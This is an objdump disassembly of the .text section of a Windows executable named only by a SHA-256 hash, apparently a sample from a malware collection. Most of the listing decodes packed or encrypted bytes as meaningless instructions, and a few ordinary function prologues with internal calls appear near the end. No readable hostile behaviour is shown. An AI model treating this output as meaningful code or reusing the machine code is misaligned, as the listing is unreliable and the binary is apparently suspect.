
e408783795f60349c18b61d799adbf17f0a47db4b5f736011ca4f96cdc208005.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	xor    ebx,DWORD PTR [esp+ecx*4-0x3d]
  4d0004:	aam    0xc2
  4d0006:	imul   eax,DWORD PTR [edx+0x63],0x56
  4d000a:	sub    eax,0xc9d037f1
  4d000f:	repnz outs dx,DWORD PTR ds:[esi]
  4d0011:	push   es
  4d0012:	(bad)  
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d0663
  4d06c1:	rcl    esp,cl
  4d06c3:	or     BYTE PTR [ebp+0x48],bh
  4d06c6:	into   
  4d06c7:	aad    0x9b
  4d06c9:	sbb    ecx,DWORD PTR [edi-0x518eb034]
  4d06cf:	mov    ?,eax
  4d06d1:	mov    dl,0xe1
  4d06d3:	int3   
  4d06d4:	xor    DWORD PTR [edi-0x2577668c],0x4e
  4d06db:	(bad)  
  4d06dc:	xor    cl,BYTE PTR [edx]
  4d06de:	fmul   DWORD PTR ds:0xbc42ba1f
  4d06e4:	mul    BYTE PTR ds:[esi+edi*4-0x6]
  4d06e9:	jo     0x4d06ca
  4d06eb:	into   
  4d06ec:	mov    edi,edi
  4d06ee:	push   ebp
  4d06ef:	mov    ebp,esp
  4d06f1:	sub    esp,0x50
  4d06f4:	mov    edi,0x4d30b4
  4d06f9:	add    edx,DWORD PTR [edi-0x54]
  4d06fc:	push   edi
  4d06fd:	mov    eax,0x0
  4d0702:	push   eax
  4d0703:	call   0x4d08c8
  4d0708:	add    esp,0x4
  4d070b:	pop    edi
  4d070c:	push   edi
  4d070d:	push   ecx
  4d070e:	push   esi
  4d070f:	push   esi
  4d0710:	call   0x4d0a08
  4d0715:	add    esp,0xc
  4d0718:	pop    edi
  4d0719:	push   edi
  4d071a:	mov    edi,0x0
  4d071f:	push   edi
  4d0720:	call   0x4d12e8
  4d0725:	add    esp,0x4
  4d0728:	pop    edi
  4d0729:	add    esp,0x50
  4d072c:	pop    ebp
  4d072d:	ret    
  4d072e:	add    BYTE PTR [eax],al
  4d0730:	mov    edi,edi
  4d0732:	push   ebp
  4d0733:	mov    ebp,esp
  4d0735:	sub    esp,0x30
  4d0738:	lea    esi,ds:0x4d31e4
  4d073e:	or     edi,0xffffffe4
  4d0741:	push   esi
  4d0742:	push   edx
  4d0743:	push   ebx
  4d0744:	push   ecx
  4d0745:	call   0x4d11f0
  4d074a:	add    esp,0xc
  4d074d:	pop    esi
  4d074e:	mov    ebx,0x0
  4d0753:	push   ebx
  4d0754:	call   0x4d0e14
  4d0759:	add    esp,0x4
  4d075c:	call   0x4d0c68
  4d0761:	add    esp,0x4
  4d0764:	add    esp,0x30
  4d0767:	pop    ebp
  4d0768:	ret    
  4d0769:	add    BYTE PTR [eax],al
  4d076b:	add    BYTE PTR [edi-0x1],bl
  4d076e:	adc    eax,0x4d209c
  4d0773:	call   edi
  4d0775:	add    BYTE PTR [eax],al
  4d0777:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d077d:	sub    esp,0x44
  4d0780:	lea    edi,[ebx+0x24]
  4d0783:	xor    edx,0xffffffc6
  4d0786:	push   edi
  4d0787:	mov    edx,0x0
  4d078c:	push   edx
  4d078d:	call   0x4d0a90
  4d0792:	add    esp,0x4
  4d0795:	pop    edi
  4d0796:	push   edi
  4d0797:	push   edx
  4d0798:	push   edx
